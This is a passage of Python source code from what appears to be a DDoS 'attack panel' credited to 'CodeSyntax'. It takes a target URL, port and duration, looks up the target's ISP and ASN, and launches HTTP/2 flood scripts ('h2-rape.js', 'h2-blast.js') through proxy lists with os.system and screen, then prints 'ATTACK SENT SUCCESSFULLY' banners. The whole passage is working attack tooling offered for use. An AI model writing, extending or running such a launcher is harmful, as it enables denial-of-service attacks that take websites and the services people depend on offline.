\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/CodeSyntax\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m CodeSyntax\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd l7 && screen -dm node h2-rape.js {url} {duration} 64 3 proxy.txt')
                    
            except ValueError:
                main()
            except IndexError:
                main()
                
        elif sinput == "h2-blast" or sinput == "H2-BLAST":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'h2-blast',
                        'status': 'Ongoing'
                    })
                    os.system('clear')
                    print(f"""
\033[1;36m      POWERED BY : [ • CodeSyntax • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/CodeSyntax\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m CodeSyntax\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd l7 && screen -dm node h2-blast.js {url} {duration} 64 3 proxy.txt')
                    
            except ValueError:
                main()
            except IndexError:
                main()

        

login_filename = "login_data.txt"
login_data = read_login_data(login_filename)

if login_data is not None:
    login(login_data)
